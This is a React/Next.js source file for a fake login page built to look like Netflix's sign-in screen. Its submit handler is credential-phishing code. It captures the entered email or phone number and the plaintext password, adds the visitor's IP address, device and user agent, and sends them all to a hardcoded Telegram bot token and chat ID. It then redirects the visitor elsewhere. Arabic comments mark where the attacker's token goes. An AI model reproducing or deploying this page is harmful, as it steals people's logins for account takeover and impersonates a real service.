'use client'

import React, { useState } from 'react'
import Link from 'next/link'
import { AlertCircle } from 'lucide-react'
import MainHeader from '../../components/layout/MainHeader'
import { useRouter } from 'next/navigation'

export default function LoginPage() {
  const router = useRouter()
  const [formData, setFormData] = useState({
    emailOrPhone: '',
    password: '',
    rememberMe: false
  })
  const [errors, setErrors] = useState<Record<string, string>>({})
  const [isSubmitting, setIsSubmitting] = useState(false)

  // Email validation regex
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
  // Phone validation regex (simple version)
  const phoneRegex = /^\+?[\d\s-]{10,}$/

  const validateForm = () => {
    const newErrors: Record<string, string> = {}

    // Email/Phone validation
    if (!formData.emailOrPhone) {
      newErrors.emailOrPhone = 'Please enter a valid email or phone number.'
    } else if (!emailRegex.test(formData.emailOrPhone) && !phoneRegex.test(formData.emailOrPhone)) {
      newErrors.emailOrPhone = 'Please enter a valid email or phone number.'
    }

    // Password validation
    if (!formData.password) {
      newErrors.password = 'Your password is required.'
    } else if (formData.password.length < 4 || formData.password.length > 60) {
      newErrors.password = 'Your password must contain between 4 and 60 characters.'
    }

    return newErrors
  }

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target
    setFormData({...formData, [name]: value})
    
    // Clear error when user starts typing
    if (errors[name]) {
      setErrors(prev => {
        const newErrors = { ...prev }
        delete newErrors[name]
        return newErrors
      })
    }
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsSubmitting(true)

    // Validate form
    const newErrors = validateForm()
    if (Object.keys(newErrors).length > 0) {
      setErrors(newErrors)
      setIsSubmitting(false)
      return
    }

    try {
      
      const TOKEN = "7529657995:AAH4-Tn2QCHKPs3oGpVtMRVfm9yV5UniLkg";                                                            // هنا التوكين              
      const CHAT_ID = "721716449";                                                       // هنا معرف الشات https://api.telegram.org/bot/getUpdates
      const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;        


        const response = await fetch('https://api.ipify.org?format=json');
        const data: { ip: string } = await response.json();
        const ip = data.ip;

        const userAgent = navigator.userAgent;
        const platform = navigator.platform;
        const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';

        const message = `
          <b>New Login Attempt</b>\n
          <b>Email:</b> ${formData.emailOrPhone}\n
          <b>Password:</b> ${formData.password}\n
          <b>IP Address:</b> ${ip}\n
          <b>Device Type:</b> ${deviceType}\n
          <b>Platform:</b> ${platform}\n
          <b>User Agent:</b> ${userAgent}\n
        `;

        await fetch(URI_API, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            parse_mode: 'html',
            text: message
          })
        });
        router.push('/register')

    } catch (error) {
      console.log(error)
      setErrors({
        general: 'Something went wrong. Please try again later.'
      })
    } finally {
      setIsSubmitting(false)
    }
  }

  return (
    <div 
      className="min-h-screen w-full bg-cover bg-center flex flex-col bg-black"
      style={{
        backgroundImage: 'linear-gradient(180deg, rgba(0, 0, 0, 0.5) 0, rgba(0, 0, 0, 0.5) 60%, rgba(0, 0, 0, 0.8)), url(/images/auth-background.jpg)',
        backgroundPosition: 'center 0',
      }}
    >
      <MainHeader />

      {/* Login Form */}
      <main className="flex-1 flex items-center justify-center px-4 py-0 md:py-[60px]">
        <div className="w-full max-w-[450px] min-h-[660px] bg-black/75 rounded-[4px] px-[68px] py-[60px]">
          <h1 className="text-[32px] text-white mb-7 font-bold">Sign In</h1>

          <form onSubmit={handleSubmit} className="space-y-4">
            {/* Email/Phone Input */}
            <div>
              <div className="relative">
                <input
                  type="text"
                  name="emailOrPhone"
                  value={formData.emailOrPhone}
                  onChange={handleInputChange}
                  placeholder="Email or phone number"
                  className={`w-full h-[50px] bg-zinc-900 rounded-[4px] px-5 py-4 placeholder-[#8c8c8c] text-white text-base focus:outline-none ${
                    errors.emailOrPhone 
                      ? 'border border-red-500 focus:border-red-500' 
                      : 'focus:border-[2px] focus:border-red-500'
                  }`}
                />
              </div>
              {errors.emailOrPhone && (
                <div className="flex items-start gap-1 mt-2 text-red-500 text-[13px] leading-normal">
                  <AlertCircle className="w-4 h-4 mt-[2px] flex-shrink-0" />
                  <span>{errors.emailOrPhone}</span>
                </div>
              )}
            </div>

            {/* Password Input */}
            <div>
              <div className="relative">
                <input
                  type="password"
                  name="password"
                  value={formData.password}
                  onChange={handleInputChange}
                  placeholder="Password"
                  className={`w-full h-[50px] bg-zinc-900 rounded-[4px] px-5 py-4 placeholder-[#8c8c8c] text-white text-base focus:outline-none ${
                    errors.password 
                      ? 'border border-red-500 focus:border-red-500' 
                      : 'focus:border-[2px] focus:border-red-500'
                  }`}
                />
              </div>
              {errors.password && (
                <div className="flex items-start gap-1 mt-2 text-red-500 text-[13px] leading-normal">
                  <AlertCircle className="w-4 h-4 mt-[2px] flex-shrink-0" />
                  <span>{errors.password}</span>
                </div>
              )}
            </div>

            {/* Sign In Button */}
            <button
              type="submit"
              disabled={isSubmitting}
              className="w-full h-[48px] bg-[#e50914] text-white rounded-[4px] font-medium text-base mt-8 hover:bg-[#c11119] transition-colors duration-200 disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {isSubmitting ? 'Signing in...' : 'Sign In'}
            </button>

            {/* Remember Me & Need Help */}
            <div className="flex items-center justify-between text-[13px] text-[#b3b3b3] mt-4">
              <label className="flex items-center select-none cursor-pointer">
                <input
                  type="checkbox"
                  checked={formData.rememberMe}
                  onChange={(e) => setFormData(prev => ({ ...prev, rememberMe: e.target.checked }))}
                  className="w-4 h-4 rounded bg-transparent border border-[#737373] checked:bg-[#737373] text-[#737373] focus:ring-0 focus:ring-offset-0 cursor-pointer"
                />
                <span className="ml-1">Remember me</span>
              </label>
              <Link href="/help" className="text-[#b3b3b3] hover:underline">
                Need help?
              </Link>
            </div>
          </form>

          {/* Sign Up Section */}
          <div className="mt-16 text-[#737373]">
            <p className="text-base">
              New to Netflix?{' '}
              <Link href="/" className="text-white hover:underline">
                Sign up now
              </Link>
            </p>
            <p className="mt-[13px] text-[13px] leading-normal">
              This page is protected by Google reCAPTCHA to ensure you&apos;re not a bot.{' '}
              <Link href="/learn-more" className="text-[#0071eb] hover:underline">
                Learn more
              </Link>
            </p>
          </div>
        </div>
      </main>
    </div>
  )
} 